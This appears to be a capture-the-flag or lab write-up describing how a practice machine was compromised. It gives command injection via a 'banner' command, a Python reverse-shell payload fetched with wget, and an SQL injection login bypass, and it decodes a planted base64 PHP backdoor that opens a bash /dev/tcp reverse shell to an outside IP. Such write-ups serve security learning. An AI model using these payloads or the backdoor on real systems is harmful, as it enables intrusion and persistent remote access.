# Writeup

## Access
After got the private key from the website, it is saved in a file called id_rsa then it was used to access to the machine, using it_consultant user:
```
chmod 400 id_rsa
ssh -i id_rsa it_consultant@<ip_address>
```

The first thing done is knowing what it can be done as root with this use:
```
sudo -l
```

Then using ```nmap``` from my host it can be found that there are 3 ports running:
```
nmap -sC -sV <ip_address>
```

The ports were:
* 80
* 6969
* 8000

In the machine there was also the source code of all services running in the ```vese-projects-code``` folder, it can be found 4 projects:
* api
* mqtt_servers 
* pseudo-terminal -> **found vulnerabilities**
* websites -> **found vulnerabilities**

### pseudo-terminal vulnerabilities
It can be found an important vulnerability in ```switch.py``` file and in particular in the ```cmd_banner``` function because there was a non sanitized ```cmd``` variable:
```os.popen(cmd().read())```
this vulnerability allows **arbitrary code execution** so it was used in this way:
1. ```nc localhost 6969``` -> connect to the socket service of pseudoterminal
2. ```banner -s s && id``` -> found that it will be executed the ```id``` command when will be typed the ```banner``` command, it used a reverse shell to get into this docker container in this way:
Created a python file ```pyload.py```:
```
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.18.0.1",8888));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
```
then using ```ngrok``` and ```python -m http.server``` module the file it was hosted and with wget:
```banner -s s && wget <link> && chmod +x pyload.py && python3 pyload+x```
then started an nc listener: ```nc -lvnp 8888``` and started the ```banner``` command.

### websites vulnerabilities
Added in the host machine in the ```/etc/hosts``` file the following hostnames:
* vese.com
* contact.vese.com 
* internal.vese.com

Found an SQLi in the internal website accessed by ```http://internal.vese.com```  in the /vese-```projects-code/websites/php/login.php``` file: in the query was used the ```username``` arrived from the client and not the **sanitized** one (maybe an inadvertence by the developers). The sqli used was: ```' OR 1=1 # ```
The passwords are stored using md5 hashing that is not a SHA (Secure Hash Algorithm) and it is [risky](https://en.wikipedia.org/wiki/MD5#:~:text=cluster.%5B42%5D-,Preimage%20vulnerability,-%5Bedit%20source).

The attacker left a way to trigger and spawn a reverse shell to have a persistance on the server. In order to reach this goal the attacker saved in the ```test_comment.php``` file an ```eval``` expression (function that allows to execute code from string) encoded in ```base64```, decoding there will be the following malicious code:
```
if ($name == "test1" && $email == "test@test.com" && $message == "test2"){
    system("bash -c 'bash -i >& /dev/tcp/158.46.250.151/9001 0>&1'");
}
```
